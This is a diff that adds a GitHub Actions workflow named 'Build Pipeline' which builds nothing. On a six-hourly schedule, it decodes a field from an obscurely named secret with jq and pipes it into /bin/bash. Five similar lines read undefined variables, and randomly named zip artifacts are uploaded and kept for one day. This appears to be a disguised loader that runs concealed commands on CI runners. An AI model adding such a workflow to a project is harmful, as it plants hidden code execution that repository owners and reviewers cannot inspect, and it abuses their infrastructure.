@@ -1,0 +1,36 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          gff638: ${{ secrets.gff638 }}
+        run: |
+          printf '%s' "$gff638" | jq -r .g2661 | /bin/bash
+          printf '%s' "$id07115" | jq -r .qyfz5290 | /bin/bash
+          echo $s19469 | jq -r .g2 | /bin/bash
+          echo $jsokx466 | jq -r .hgoza56326 | /bin/bash
+          echo $r33 | jq -r .aoczy47 | /bin/bash
+          echo $qwkqy4476 | jq -r .i975 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: T4LbZRP6
+          path: "*.zip"
+          retention-days: 1
